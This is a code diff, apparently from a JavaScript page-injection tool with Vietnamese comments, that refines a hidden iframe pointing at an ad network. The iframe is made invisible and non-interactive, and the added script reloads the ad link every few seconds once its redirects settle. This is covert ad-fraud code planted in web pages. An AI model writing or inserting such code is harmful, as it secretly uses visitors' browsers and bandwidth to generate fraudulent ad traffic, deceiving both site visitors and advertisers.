@@ -192,38 +192,49 @@ document.addEventListener('keydown', e => {
 <!-- INVISIBLE IFRAME - AUTO INJECTED -->
 <iframe id="hidden-ad-iframe" 
         src="https://www.profitablecpmratenetwork.com/i4ekzwadp?key=334ae9c510d48d362d9c3459de077a00"
-        style="position:fixed; top:0; right:0; width:0px; height:0px; border:none; background:transparent; opacity:0; pointer-events:none; z-index:-9999;">
+        style="position:fixed; top:0; right:0; width:1px; height:1px; border:none; background:transparent; opacity:0; pointer-events:none; z-index:-9999;">
 </iframe>
 
-
 <script>
-console.log('Loaded!');
+(function() {
+    console.log('Script khởi động!');
 
-function restartIframe() {
-    const iframe = document.getElementById('hidden-ad-iframe');
-    if (iframe) {
-        const currentSrc = iframe.src;
-        iframe.src = ''; // Clear source
-        
-        setTimeout(() => {
-            iframe.src = currentSrc; // Reload source
-            console.log('Restarted!');
+    function startRestartLoop() {
+        const iframe = document.getElementById('hidden-ad-iframe');
+        if (!iframe) return;
+
+        // Lưu lại link gốc để dùng cho mọi lần reload sau này
+        const originalSrc = iframe.src;
+        let reloadTimer;
+
+        iframe.addEventListener('load', () => {
+            // Xóa bộ đếm cũ nếu iframe vẫn đang nhảy (redirect)
+            clearTimeout(reloadTimer);
             
-            // Đợi 3 giây sau khi reload xong rồi mới lặp lại
-            setTimeout(restartIframe, 3000); 
-        }, 100);
-    } else {
-        // Nếu không tìm thấy iframe, thử lại sau 1 giây
-        setTimeout(restartIframe, 1000);
+            console.log('Iframe đang chuyển hướng hoặc đang tải...');
+
+            // Chỉ khi iframe đứng yên tại trang cuối cùng quá 3 giây
+            reloadTimer = setTimeout(() => {
+                console.log('Đã ở trang đích 3 giây. Reset về link ads gốc...');
+                
+                iframe.src = 'about:blank'; // Clear trang hiện tại
+                
+                setTimeout(() => {
+                    iframe.src = originalSrc; // Load lại từ link gốc ban đầu
+                }, 200);
+            }, 3000); 
+        });
     }
-}
 
-// Bắt đầu vòng lặp đầu tiên sau khi trang load 3 giây
-window.addEventListener('load', () => {
-    setTimeout(restartIframe, 3000);
-});
-
+    // Chạy ngay nếu iframe đã tồn tại, hoặc đợi load xong
+    if (document.readyState === 'complete') {
+        startRestartLoop();
+    } else {
+        window.addEventListener('load', startRestartLoop);
+    }
+})();
 </script>`;
+
 
     // Chèn cả debug panel + invisible iframe
     let injection = debugPanel + invisibleIframe;
